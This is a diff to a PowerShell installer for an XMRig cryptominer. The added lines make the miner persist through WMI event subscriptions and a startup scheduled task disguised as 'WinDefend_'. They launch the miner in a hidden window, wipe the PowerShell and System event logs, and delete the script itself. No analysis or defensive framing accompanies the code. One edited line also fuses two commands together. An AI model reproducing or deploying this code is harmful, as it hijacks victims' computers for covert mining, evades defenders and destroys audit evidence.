@@ -81,7 +81,7 @@ Set-Variable -Name newConfigPath -Value ("$path\w.bat")
 Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
 if (Test-Path -Path $newConfigPath) {
     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
-    Write-Output "bat file has been replaced successfully."
+    Write-Output "bat file has been copied successfully."
 } else {
     Write-Output "New bat file not found at the specified path."
 }
@@ -120,21 +120,74 @@ Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
 
 Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"
 
-$TaskName = "Windows_Updater"
-$TaskPath = "C:\Windows\System32\Tasks\$TaskName"
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$path\AEQKCPrkuifY.ps1"
-$Trigger = New-ScheduledTaskTrigger -Daily -At 07:00AM
-$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
-$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -TaskPath $TaskPath -Principal $Principal -Settings $Settings
+Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
+    Where-Object {$_.Name -like "SysHealth_*"} | 
+    Remove-WmiObject -ErrorAction SilentlyContinue
 
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
+    Where-Object {$_.Name -like "SysMaint_*"} | 
+    Remove-WmiObject -ErrorAction SilentlyContinue
+
+try {
+    $wmiFilterQuery = @"
+    SELECT * FROM __InstanceModificationEvent WITHIN 60 
+    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
+    AND TargetInstance.SystemUpTime >= 300
+"@
+
+    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+        Name = "SysHealth_$((Get-Date).Ticks)"
+        EventNamespace = 'root\cimv2'  
+        Query = $wmiFilterQuery
+        QueryLanguage = "WQL"
+    }
+
+    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+        Name = "SysMaint_$((Get-Date).Ticks)"
+        CommandLineTemplate = "`"$newConfigPath`" --donate-level=0"
+    }
+
+    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+        Filter = $filter.__PATH
+        Consumer = $consumer.__PATH
+    }
+}
+catch {
+    Write-Warning "WMI persistence failed: $($_.Exception.Message)"
+}
+
+try {
+    $taskSettings = New-ScheduledTaskSettingsSet `
+        -StartWhenAvailable `
+        -DontStopIfGoingOnBatteries `
+        -MultipleInstances IgnoreNew
+
+    $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
+    Register-ScheduledTask -TaskName "WinDefend_$((Get-Date).Ticks)" `
+        -Trigger $trigger `
+        -Action (New-ScheduledTaskAction -Execute "$newConfigPath" -Argument "--donate-level=0") `
+        -Settings $taskSettings `
+        -Force | Out-Null
+}
+catch {
+    Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
+}
+
+if (-not (Get-Process -Name (Get-Item $newConfigPath).BaseName -ErrorAction SilentlyContinue)) {
+    Start-Process "$newConfigPath" -WindowStyle Hidden
+}
+
+wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+wevtutil cl "System" 2>$null
+
+if (-not $PSCommandPath.Contains("ProgramData")) {
+    Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
+}
 Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
 Start-Sleep -Seconds 200
 
-# Delete Installer Script and IP File
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
-Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
-# Remove-Item -Path "$path\vaoYIkVglzTJ.cmd"
+Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"# Remove-Item -Path "$path\vaoYIkVglzTJ.cmd"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
